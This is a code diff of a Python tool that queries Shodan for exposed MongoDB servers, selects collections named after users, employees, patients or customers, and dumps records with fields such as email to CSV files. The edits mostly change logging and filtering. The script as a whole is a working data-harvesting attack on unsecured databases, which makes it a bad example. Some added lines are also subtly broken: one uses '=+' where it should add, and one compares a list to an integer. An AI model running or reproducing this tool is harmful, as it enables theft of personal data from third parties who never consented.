@@ -2,7 +2,6 @@ import pymongo
 import pandas as pd
 import os
 import json
-import sys
 from colorama import Fore
 import shodan
 import ODBconfig
@@ -13,19 +12,19 @@ pd.options.display.width = 0
 
 """TO DO:
 1. multithread
-2. connect to ES scraper
 3. 
 """
-
+numfieldsreq = int(ODBconfig.numfieldsrequired)
 basepath = ODBconfig.basepath
 typelist = ODBconfig.typelist
-collectionamesIwant = ODBconfig.collectionamesIwant #collectionamesIwant = ["users","employees","patients","customers","clients"]
-SHODAN_API_KEY = ODBconfig.SHODAN_API_KEY #put your key here
+collectionamesIwant = ODBconfig.collectionamesIwant
+SHODAN_API_KEY = ODBconfig.SHODAN_API_KEY
+
+if not basepath:
+    basepath = os.path.join(os.getcwd(),"open directory dumps")
 
 if not os.path.exists(basepath):
     os.makedirs(basepath)
-
-
 
 
 def shodan_query(query):
@@ -109,23 +108,23 @@ def mongodbscraper(dbip,portnumber=27017,careaboutpwnedcollections=True,careabou
 
             collectionNames = []
             collectionstoget = []
-
+            totalnumofcollection=0
             if any(z in listofdbs for z in pwnedDBs):
-                print(f"    {Fore.LIGHTRED_EX}{dbip} has been {Fore.RED} pwned{Fore.RESET}, moving on")
+                print(f"    {Fore.LIGHTRED_EX}{dbip}{Fore.RESET} has been {Fore.LIGHTGREEN_EX}PWNED{Fore.RESET}, moving on")
                 pass
             else:
                 for x in listofdbs:
                     collections = client[x].list_collection_names() #to sub collection name as variable is string
                     collections = [x for x in collections if "system." not in x] #filter out mongodob system files
+                    totalnumofcollection=+ len(collections)
                     if any(z in collections for z in pwnedcollections): #check if any of the collections have been pwned, if so skip the index
-                        print(f"    {Fore.LIGHTRED_EX}{dbip}: {x} has been {Fore.RED}pwned{Fore.RESET}, moving on")
+                        print(f"    {Fore.LIGHTRED_EX}{x}{Fore.RESET} has been {Fore.LIGHTGREEN_EX}PWNED{Fore.RESET}, moving on")
                         collections = []
                     else:
                         collectionNames.append({x:collections})
-                        if len(collections)>0:
-                            print(f"    Found {Fore.LIGHTBLUE_EX}{str(len(collections))} {Fore.RESET}collections in {Fore.LIGHTRED_EX}{x}{Fore.RESET}.") #Collections include: {','.join(collections[:10])}")
-                        else:
-                            print(f"    Found {Fore.LIGHTBLUE_EX}{str(len(collections))}{Fore.RESET} collections in {Fore.LIGHTRED_EX}{x}.{Fore.RESET}")
+                        #if len(collections)>0:
+                         #   print(f"    Found {Fore.LIGHTBLUE_EX}{str(len(collections))} {Fore.RESET}collections in {Fore.LIGHTRED_EX}{x}{Fore.RESET}.") #Collections include: {','.join(collections[:10])}")
+
                         #for y in collections:
                     for y in collections: #next 3 lines check if term i want is part of collection name
                         if collectionamesIwant: #check if care about collection names
@@ -133,7 +132,7 @@ def mongodbscraper(dbip,portnumber=27017,careaboutpwnedcollections=True,careabou
                                 if client[x][y].estimated_document_count()>40: #check to see if collection has at least X number of items
                                     if Icareaboutsize:
                                         if client[x][y].estimated_document_count() < 800000: #change this number if you want
-                                            print(f"        A collection you may want is: {Fore.LIGHTRED_EX}{y} in {x}{Fore.RESET} with {Fore.LIGHTBLUE_EX}{client[x][y].estimated_document_count():,d} {Fore.RESET}documents",end='\r')
+                                            #print(f"        A collection you may want is: {Fore.LIGHTRED_EX}{y} in {x}{Fore.RESET} with {Fore.LIGHTBLUE_EX}{client[x][y].estimated_document_count():,d} {Fore.RESET}documents",end='\r')
                                             collectionstoget.append((x,y))
                                         else:
                                             toobig.append((f"{dbip}:{portnumber}",x,y,str(client[x][y].estimated_document_count())))
@@ -153,8 +152,8 @@ def mongodbscraper(dbip,portnumber=27017,careaboutpwnedcollections=True,careabou
             def dumpMongoDbcollectiontoCSV(database, collection):
                 if typelist:
                     collectionkeys = getCollectionKeys(client[database][collection]) #get all keys in collection
-                    if [x for x in collectionkeys if any(y in x for y in typelist)]:  #check if key i want is there if so, grab it! e.g. if there is field for "email" etc
-
+                    if [x for x in collectionkeys if any(y in x for y in typelist)]>numfieldsreq:  #check if key i want is there if so, grab it! e.g. if there is field for "email" etc
+                        print(f"    Found desired fields in {Fore.LIGHTRED_EX} {database}:{collection}")
                         cursor = client[database][collection].find()  # grab all records
                         df = pd.DataFrame(list(cursor))
                         cols = df.columns
@@ -168,7 +167,7 @@ def mongodbscraper(dbip,portnumber=27017,careaboutpwnedcollections=True,careabou
                         df.to_csv(os.path.join(basepath,dbip, f"{dbip}_{database}_{collection}_MDB.csv"),index=False)
                         return (len(df))
                     else:
-                        print (f"        Nevermind...no fields of interest in {Fore.LIGHTRED_EX}{database}:{Fore.LIGHTGREEN_EX}{collection}{Fore.RESET}",end='\r')
+                        print (f"        Nevermind...no fields of interest in {Fore.LIGHTRED_EX}{database}:{Fore.LIGHTGREEN_EX}{collection}{Fore.RESET}")
                         return (0)
                 else:
                     print(f"        Didn't specify fields you want to filter on, so gonna grab{Fore.RED}{database}:{collection}{Fore.RESET}")
@@ -184,8 +183,13 @@ def mongodbscraper(dbip,portnumber=27017,careaboutpwnedcollections=True,careabou
 
                     df.to_csv(os.path.join(basepath, dbip, f"{dbip}_{database}_{collection}_MDB.csv"), index=False)
                     return (len(df))
+            if collectionNames:
+                print(f"    Found total of {Fore.LIGHTBLUE_EX}{totalnumofcollection}{Fore.RESET} collections in {Fore.LIGHTBLUE_EX}{len(listofdbs)}{Fore.RESET} databases")
 
             if collectionstoget:
+                ok = "\n        " + "\n        ".join([f"{Fore.LIGHTRED_EX}{x[1]}{Fore.RESET} in database:{Fore.LIGHTRED_EX}{x[0]}{Fore.RESET}" for x in collectionstoget[:5]])
+                print(F"    Of those, found {Fore.LIGHTBLUE_EX}{str(len(collectionstoget))}{Fore.RESET} collections that match desired collection names, including: {ok}")
+
                 for x in collectionstoget:
                     db, collection = x
 
@@ -193,12 +197,15 @@ def mongodbscraper(dbip,portnumber=27017,careaboutpwnedcollections=True,careabou
                     totalrecords += recordcount
 
                     if recordcount >0:
-                        print(f"    Succesfully dumped {Fore.LIGHTRED_EX}{collection}{Fore.RESET} from {Fore.LIGHTRED_EX}{db} {Fore.RESET}")
+                        print(f"        Succesfully dumped {Fore.LIGHTRED_EX}{collection}{Fore.RESET} from {Fore.LIGHTRED_EX}{db} {Fore.RESET}")
                         totaldbs+=1
+            else:
+                print(F"    Of those, found {Fore.LIGHTBLUE_EX}ZERO{Fore.RESET} collections that match desired collection names.")
+
             with open(os.path.join(basepath, "MongoFound.json"), 'w') as outfile:
                 outfile.write(json.dumps(newjson))
             if totalrecords>0:
-                print (f"    Dumped \033[94m{totalrecords:,d}\x1b[0m total records from \033[94m{str(totaldbs)}\x1b[0m collections")
+                print (f"{Fore.LIGHTGREEN_EX}Dumped{Fore.RESET} \033[94m{totalrecords:,d}\x1b[0m total records from \033[94m{str(totaldbs)}\x1b[0m collections")
     print(f'{Fore.RED}#############################################\n{Fore.RESET}')
 
     return totaldbs,totalrecords#return collectionstoget
@@ -219,22 +226,3 @@ def dbgetter(query):
             ipaddress = x["ip_str"]
             mongodbscraper(ipaddress)
 
-
-#example query
-#dbgetter('product:mongodb port:27017 users country:"US"')
-
-if __name__ == '__main__':
-    for x in ipsfromclipboard():
-        mongodbscraper(x)
-
-"""
-# print the number of documents in a collection
-call = client[db].command("dbstats") #to get stats of db
-database = call['db']
-datasize = call['dataSize'] / 1024
-objects = call['objects']
-collections = call['collections']
-
-for data in db.myusers.find().limit(2):
-    print data
-"""
